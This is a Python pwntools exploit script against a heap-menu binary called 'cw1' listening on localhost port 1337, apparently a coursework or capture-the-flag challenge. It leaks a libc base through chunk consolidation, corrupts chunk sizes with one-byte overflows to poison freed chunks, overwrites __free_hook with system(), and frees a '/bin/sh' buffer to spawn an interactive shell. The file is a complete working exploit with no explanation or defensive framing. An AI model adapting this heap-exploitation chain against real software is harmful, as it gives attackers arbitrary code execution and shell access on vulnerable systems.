from pwn import *
import time

class HeapExploiter:
    def __init__(self):
        self.context = context
        self.context.terminal = ['tmux', 'splitw', '-h']
        self.elf = ELF("./cw1")
        self.target = remote("127.0.0.1", 1337)
        self.libc_base = None
        
    def allocate_chunk(self, index, size):
        self.target.sendline(f"1 {index} {size}".encode())
        
    def free_chunk(self, index):
        self.target.sendline(f"2 {index}".encode())
        
    def inspect_chunk(self, index):
        self.target.sendline(f"4 {index}".encode())
        
    def write_to_chunk(self, index, data):
        self.target.sendline(f"3 {index}".encode())
        self.target.sendline(data)
        time.sleep(1)
        self.target.sendlineafter(b"Would you like to save this buffer to disk? (y/n):", b"y")
        
    def list_directory(self, path=b"\n"):
        self.target.sendline(b"6")
        self.target.sendlineafter(b"Enter a file name to list (or press Enter for current directory):", path)
        
    def modify_chunk(self, index, data):
        self.target.sendline(f"5 {index}".encode())
        self.target.send(data)
        
    def leak_libc_address(self):
        # First consolidation to leak libc address
        self.allocate_chunk(11, 0x420)
        self.allocate_chunk(12, 0x100)
        self.free_chunk(11)
        self.allocate_chunk(13, 0x420)
        self.inspect_chunk(13)
        
        leaked_data = self.target.recvline_contains(b"Enter the file slot to view it:")
        libc_leak = leaked_data.replace(b"\x00", b"").split(b" ")[-1][0:6]
        self.libc_base = u64(libc_leak.ljust(8, b"\x00")) - 0x1ecbe0
        log.info(f"Libc base: {hex(self.libc_base)}")
        
    def prepare_free_hook_write(self):
        # Second consolidation to prepare free_hook overwrite
        for i in range(5, -1, -1):
            self.allocate_chunk(i, 0x28)
            
        [self.free_chunk(i) for i in [1, 4]]
        
        self.write_to_chunk(12, b"F"*264)
        self.modify_chunk(12, b"F"*264 + b"\x40")
        
        free_hook_offset = 0x1eee48 - 24
        self.write_to_chunk(5, b"\x90"*40 + p64(0x31) + p64(self.libc_base + free_hook_offset))
        self.allocate_chunk(20, 0x28)
        
    def overwrite_free_hook(self):
        # Third consolidation to overwrite free_hook
        for i in range(10, 5, -1):
            self.allocate_chunk(i, 0x38)
            
        [self.free_chunk(i) for i in [6, 8]]
        
        self.write_to_chunk(10, b"n"*56)
        self.modify_chunk(10, b"s"*56 + b"\x50")
        
        target_addr = 0x1eee45
        self.write_to_chunk(9, b"\x90"*56 + p64(0x41) + p64(self.libc_base + target_addr))
        
        self.allocate_chunk(22, 0x38)
        self.allocate_chunk(23, 0x38)
        
        system_addr = self.libc_base + 0x52290
        self.write_to_chunk(23, b"\x00"*0x3 + p64(system_addr) + p64(0x0))
        
    def spawn_shell(self):
        self.allocate_chunk(14, 0x20)
        self.write_to_chunk(14, b"/bin/sh\x00")
        self.target.interactive()
        
    def execute_exploit(self):
        self.leak_libc_address()
        self.prepare_free_hook_write()
        self.list_directory()  # Trigger initial setup
        self.overwrite_free_hook()
        self.spawn_shell()

if __name__ == "__main__":
    exploiter = HeapExploiter()
    exploiter.execute_exploit()